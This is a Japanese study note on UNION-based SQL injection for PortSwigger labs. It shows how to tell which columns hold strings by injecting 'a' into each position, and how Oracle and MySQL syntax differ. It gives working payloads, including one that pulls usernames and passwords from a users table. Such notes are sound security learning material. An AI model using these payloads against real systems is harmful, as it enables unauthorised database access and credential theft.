
# 🔥 列数が分かった後、どの列が文字列を保持できるか調べる方法

---

## ## 1. データベースごとの基本構文の違い

### **Oracle**
```sql
' UNION SELECT NULL FROM DUAL--
```
- Oracle では **DUAL** という特殊テーブルが必要  
- これが出てきたら Oracle 確定

---

### **MySQL**
```sql
' UNION SELECT NULL--
```
- `--` の後に **スペース必須**  
- または `#` を使ってもOK  
- PortSwigger の多くのラボは **MySQL / MariaDB**

---

## ## 2. 文字列を保持できる列を調べる方法

### **問題点**
- 列数は分かった  
- でも **どの列が文字列型（VARCHAR / TEXT）なのかは分からない**

UNION は **型が合わないとエラー**になるため、  
「文字列を入れても壊れない列」を探す必要がある。

---

## ## 3. 各列に `'a'` を入れてテストする

列数が 4 の例：

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

---

## ## 4. 判定方法

### ❌ エラーが出る  
→ その列は **数値型（int など）**  
→ `'a'` を入れると型不一致で落ちる

### ✅ エラーが出ない ＆ `'a'` が画面に出る  
→ その列は **文字列型（VARCHAR / TEXT）**  
→ UNION で文字列を入れられる

---

## ## 5. なぜ必要なのか？

ユーザー名・パスワードは **文字列**。

だから：

```sql
' UNION SELECT username, password FROM users--
```

を実行するには、

- username を入れる列  
- password を入れる列  

が **文字列型である必要がある**。

型が合わないと SQL が壊れて 500 エラーになる。

---

## ## 6. この調査は次のラボで必ず使う

PortSwigger の SQLi ラボは：

1. 列数調査  
2. **型調査（今回の内容）**  
3. DB判別  
4. テーブル探索  
5. 列名探索  
6. データ抽出  

という順番で進む。

---
